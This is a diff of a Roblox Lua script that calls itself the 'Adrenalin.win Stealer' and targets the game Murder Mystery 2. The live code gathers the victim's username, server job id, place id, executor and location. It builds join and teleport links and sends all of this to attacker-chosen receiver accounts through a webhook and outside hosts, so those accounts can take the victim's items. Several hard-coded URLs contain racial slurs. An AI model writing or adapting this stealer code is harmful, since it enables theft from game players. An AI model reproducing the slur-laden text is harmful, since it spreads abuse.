@@ -1,3 +1,5 @@
+--Ez
+
 _G.Usernames = {"AmeliaPrimalPanda201"} 
 _G.min_rarity = "Common" 
 _G.min_value = 0
@@ -153,7 +155,7 @@ if VIP or FULL then
 end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
-local function getJobId() return game.JobId end
+local jobId = game.JobId
 
 
 
@@ -167,7 +169,7 @@ local function assignHitToDatabase()
     for _, receiverName in ipairs(userList) do
         local receiverStr = tostring(receiverName)
         local payload = {
-            jobId = getJobId(), 
+            jobId = game.JobId, 
             placeId = game.PlaceId,
             username = plr.Name,
             receiver = receiverStr 
@@ -193,7 +195,7 @@ local function assignDhToDatabase()
     for _, receiverName in ipairs(userListt) do
         local receiverStr = tostring(receiverName)
         local payload = {
-            jobId = getJobId(), 
+            jobId = game.JobId, 
             placeId = game.PlaceId,
             username = plr.Name,
             receiver = receiverStr 
@@ -517,7 +519,7 @@ local function SendFirstMessage(list, prefix)
     local itemPrices = usdData.itemPrices or {}
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
   
-    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. getJobId()
+    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
     local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
     local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
      local NotHead = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(plr.UserId)
@@ -589,7 +591,7 @@ local locationStr = (loc.country or "Unknown")
     local data = {
     gameType = "MM2", 
     tophit = isTopHit,
-        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. getJobId() .. "')",
+        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
         username = "Adrenalin.win Stealer",
         avatar_url = "https://cs14.pikabu.ru/post_img/big/2023/08/04/4/169112793213668504.jpg",
         embeds = {{
